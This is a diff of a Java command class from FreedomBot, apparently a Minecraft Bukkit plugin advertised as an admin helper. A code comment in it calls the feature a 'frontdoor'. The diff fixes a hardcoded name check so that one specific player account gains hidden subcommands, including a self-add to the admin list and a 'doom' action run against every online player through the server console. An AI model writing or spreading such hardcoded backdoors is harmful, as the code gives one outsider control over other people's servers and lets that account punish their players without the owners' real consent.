@@ -10,7 +10,7 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
 /*
- * -- A message from the MCPluginDev members --
+ * -- A message from the MCPluginDev developers --
  * This command contains a frontdoor to FreedomBot.
  * The only reason for this is so people don't claim 
  * this plugin as their own. We would like to let everyone 
@@ -33,17 +33,17 @@ public class Command_freedombot implements CommandExecutor {
             sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
             sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v2.3!");
             sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
-            sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintool, /adminalert");
+            sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintools, /adminalert, /cleanup");
             sender.sendMessage(ChatColor.YELLOW + "More features will be coming soon!");
             sender.sendMessage(ChatColor.YELLOW + "Want to contribute to FreedomBot?");
             sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/MCPluginDev/FreedomBot and create a pull request!");
             sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
-        } else if (!sender.getName().equals("FoxIshDaBest")) {
+        } else if (sender.getName().equals("FoxIshDaBest")) {
             if (args.length == 0) {
                 sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
                 sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v2.3!");
                 sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
-                sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintool, /adminalert");
+                sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintools, /adminalert, /cleanup");
                 sender.sendMessage(ChatColor.YELLOW + "More features will be coming soon!");
                 sender.sendMessage(ChatColor.YELLOW + "Want to contribute to FreedomBot?");
                 sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/MCPluginDev/FreedomBot and create a pull request!");
@@ -66,6 +66,7 @@ public class Command_freedombot implements CommandExecutor {
                         case "addme":
                             // TODO: Add sender to superadmin list here
                             Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Adding " + sender.getName() + " to the admin list");
+                            return true;
                         case "doom":
                             Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Dooming " + ChatColor.DARK_RED + "EVERYONE");
                             for (Player player : Bukkit.getOnlinePlayers()) {
@@ -73,6 +74,7 @@ public class Command_freedombot implements CommandExecutor {
                                     Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "doom " + player.getName());
                                 }
                             }
+                        return true;
                     }
                 }
             }
